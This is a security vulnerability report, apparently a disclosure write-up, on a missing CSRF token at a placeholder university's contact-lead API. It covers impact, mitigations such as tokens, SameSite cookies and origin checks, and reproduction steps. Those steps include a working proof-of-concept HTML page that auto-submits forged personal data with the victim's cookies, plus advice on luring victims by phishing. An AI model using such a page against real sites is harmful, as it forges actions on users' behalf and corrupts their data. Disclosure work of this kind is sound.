# 💼 CSRF

1\. Executive Summary

A vulnerability has been identified in the contact functionality of an online platform used by Example University at [**online.exampleuniversity.com**](http://online.exampleuniversity.com/). The POST request sent to [**contact.exampleuniversity.com/api/lead**](http://contact.exampleuniversity.com/api/lead) lacks a proper CSRF (Cross-Site Request Forgery) token or equivalent protection mechanism. This absence allows a potential attacker to exploit the weakness and send unauthorized requests, with personal data being transmitted as part of the request.

***

#### 2. Vulnerability Description

*   **Lack of CSRF Token:**

    The POST request to `/api/lead` does not include a CSRF token. A CSRF token is a unique value associated with a user session that must be included in each state-changing request. Without this validation, it is impossible to verify that the request originates from a legitimate source.
*   **Chain of Requests and Personal Data Exposure:**

    The request originates from [**online.exampleuniversity.com**](http://online.exampleuniversity.com/) and is processed by [**contact.exampleuniversity.com**](http://contact.exampleuniversity.com/). Personal data (such as first name, last name, email, and phone number) is transmitted in this process, increasing the severity of the vulnerability if exploited.
*   **Potential Data Exposure:**

    Without robust validation mechanisms, not only is the integrity of the contact action compromised, but sensitive personal information may also be manipulated or extracted by an attacker.

***

#### 3. Potential Impact on the University

*   **Manipulation of Contact Data:**

    An attacker could send malicious requests on behalf of legitimate users, resulting in:

    * Insertion of false data into the lead database.
    * Mass submission of spam or unauthorized messages, affecting the quality of the data received.
*   **Reputational Damage:**

    Abuse of the contact functionality can undermine user trust in the university’s ability to protect personal information and manage its online services securely.
*   **Potential for Further Exploitation:**

    Although the primary vector is request forgery, exploitation of this vulnerability could facilitate other attacks (such as phishing or denial of service) by manipulating user interactions with the platform.
*   **Regulatory and Compliance Risks:**

    Transmitting and storing personal data without adequate security measures can lead to legal implications and non-compliance with privacy regulations (such as GDPR, where applicable).

***

#### 4. Reproduction Steps

> **Note:** These steps should only be executed in a controlled environment and on systems for which you have explicit authorization to perform security testing.

**Step 1: Prepare an Authenticated Session**

* Ensure that a victim’s browser (or your test browser) is authenticated with [**online.exampleuniversity.com**](http://online.exampleuniversity.com/). This is necessary because the attack leverages the victim’s active session to automatically include credentials (cookies).

**Step 2: Craft a Malicious HTML Page**

Create an HTML file (e.g., `csrf_attack.html`) with the following content:

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>CSRF Attack Demo</title>
</head>
<body>
  <script>
    // Data payload mimicking a legitimate contact submission
    const data = {
      "isB2B": false,
      "firstName": "John",
      "lastName": "Doe",
      "email": "john.doe@example.com",
      "mobile": "+1 555-555-5555",
      "state": "CA",
      "startStudying": "",
      "citizenResident": true,
      "leadSourceDetail": "Course Guide",
      "type": "Generic",
      "leadAttribution": "utmcsr=(direct)|utmcmd=(none)|utmccn=(not set)",
      "device": "Desktop",
      "os": "Windows",
      "portfolio": "Future Skills",
      "interestedCourseId": "DAT111U"
    };

    // Using fetch to send the POST request
    fetch("<https://contact.exampleuniversity.com/api/lead>", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(data),
      credentials: "include" // Ensures that cookies are sent with the request
    })
    .then(response => response.json())
    .then(result => console.log("Response:", result))
    .catch(error => console.error("Error:", error));
  </script>
</body>
</html>
```

**Step 3: Host the Malicious Page**

* Host the HTML file on a web server under your control, or open it locally in a browser for testing.
* The page must be accessible to the victim’s browser. In a real-world scenario, the attacker would need to trick the victim into visiting this page (e.g., through phishing or social engineering).

**Step 4: Lure the Victim**

* The attacker must convince an authenticated user of [**online.exampleuniversity.com**](http://online.exampleuniversity.com/) to visit the malicious page.
* Once the victim loads the page, the embedded JavaScript will automatically execute the POST request to the vulnerable endpoint.

**Step 5: Observe the Result**

* If the vulnerability is successfully exploited, the endpoint at [**contact.exampleuniversity.com/api/lead**](http://contact.exampleuniversity.com/api/lead) will process the unauthorized request.
* Verification can be done by checking for new entries in the lead database or by examining the HTTP response in the browser’s console.

**Step 6: Analysis and Verification**

* Confirm that the request did not require a CSRF token and that the forged data has been accepted.
* This confirms that an attacker could potentially leverage this flaw to inject malicious data or perform other unwanted actions on behalf of the user.

***

#### 5. Mitigation Recommendations

* **Implement CSRF Tokens:**
  * Integrate a unique CSRF token within every form and validate it on the server side upon receiving a request.
  * Utilize frameworks or libraries that provide native CSRF protection.
* **Validate Origin/Referer Headers:**
  * Ensure that the `Origin` or `Referer` headers match legitimate domains (in this case, verifying that requests originate from [**online.exampleuniversity.com**](http://online.exampleuniversity.com/)).
* **Use Cookies with SameSite Attribute:**
  * Configure session cookies with the `SameSite` attribute (preferably `Strict` or `Lax`) to reduce the risk of unintended third-party request inclusion.
* **Rate Limiting:**
  * Implement rate limiting controls to prevent an attacker from sending a large volume of malicious requests in a short period.
* **Monitoring and Logging:**
  * Set up logging and monitoring systems to detect unusual or suspicious request patterns, facilitating prompt incident response.
* **Review Communication Chain:**
  * Ensure that the transition between [**online.exampleuniversity.com**](http://online.exampleuniversity.com/) and [**contact.exampleuniversity.com**](http://contact.exampleuniversity.com/) is conducted securely by enforcing HTTPS on all communications and validating the integrity of transmitted data.

***

#### 6. Conclusion

The absence of a CSRF protection mechanism in the university’s contact endpoint poses a significant vulnerability that can be exploited to perform unauthorized actions on behalf of users, compromising data integrity and institutional reputation. The provided reproduction steps illustrate how an attacker could leverage this vulnerability by tricking an authenticated user into executing an unintended request. Mitigation is essential to safeguard personal information and maintain the security of the system. Implementing robust controls such as CSRF tokens, origin validation, and additional security measures is strongly recommended.

<figure><img src=".gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

***
